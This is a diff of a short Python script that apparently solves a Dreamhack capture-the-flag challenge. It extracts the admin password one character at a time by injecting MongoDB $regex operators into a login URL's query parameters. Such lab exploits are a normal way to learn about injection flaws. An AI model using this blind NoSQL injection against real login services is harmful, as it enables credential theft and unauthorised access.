@@ -1,18 +1,17 @@
-import requests
-import string
+import requests, string
 
-digits_letters = string.digits + string.ascii_letters
-HOST = "http://host3.dreamhack.games:15236"
+HOST = "http://host3.dreamhack.games:10767"
+ALPHANUMERIC = string.digits + string.ascii_letters
+SUCCESS = "admin"
+
 flag = ""
-
 for i in range(32):
-    for ch in digits_letters:
+    for ch in ALPHANUMERIC:
         response = requests.get(
-            f"{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}"
+            f"{HOST}/login?uid[$regex]=admin&upw[$regex]={flag}{ch}"
         )
-        if "admin" in response.text:
-            print(f"DH{{{flag}*}}")
+        print(response)
+        if response.text == SUCCESS:
             flag += ch
             break
-
-print(f"DH{{{flag}}}")
+    print(f"FLAG: DH{{{flag}}}")
